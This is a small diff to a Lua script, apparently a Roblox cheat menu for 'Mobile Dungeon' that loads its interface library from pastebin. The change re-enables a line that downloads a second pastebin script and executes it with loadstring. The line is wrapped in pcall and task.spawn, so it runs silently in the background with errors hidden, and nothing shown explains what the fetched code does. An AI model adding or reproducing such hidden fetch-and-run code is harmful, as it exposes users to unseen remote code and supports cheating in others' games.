@@ -1,7 +1,7 @@
 local DrRayLibrary = loadstring(game:HttpGet('https://pastebin.com/raw/UUFzsMiA'))()
 pcall(function()
 	task.spawn(function()
-		--loadstring(game:HttpGet('https://pastebin.com/raw/B5DMhTNB'))()
+		loadstring(game:HttpGet('https://pastebin.com/raw/B5DMhTNB'))()
 	end)
 end)
 local window = DrRayLibrary:Load("Mobile Dungeon", "Default")
